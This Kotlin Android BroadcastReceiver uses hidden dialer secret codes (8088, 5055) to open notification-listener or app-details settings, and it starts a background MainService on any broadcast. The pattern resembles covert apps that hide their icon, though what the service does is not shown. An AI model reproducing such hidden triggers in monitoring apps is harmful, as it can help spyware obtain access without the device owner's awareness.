package com.neaking

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import androidx.annotation.RequiresApi

class MyReceiver : BroadcastReceiver() {
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP_MR1)
    override fun onReceive(context: Context, intent: Intent) {
        var intent = intent
        if (intent.action == "android.provider.Telephony.SECRET_CODE") {
            val uri = intent.dataString
            val sep = uri!!.split("://".toRegex()).toTypedArray()
            if (sep[1].equals("8088", ignoreCase = true)) {
                context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            } else if (sep[1].equals("5055", ignoreCase = true)) {
                val i = Intent(
                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + BuildConfig.APPLICATION_ID)
                )
                context.startActivity(i)
            }
        }
        intent = Intent(context, MainService::class.java)
        context.startService(intent)
    }
}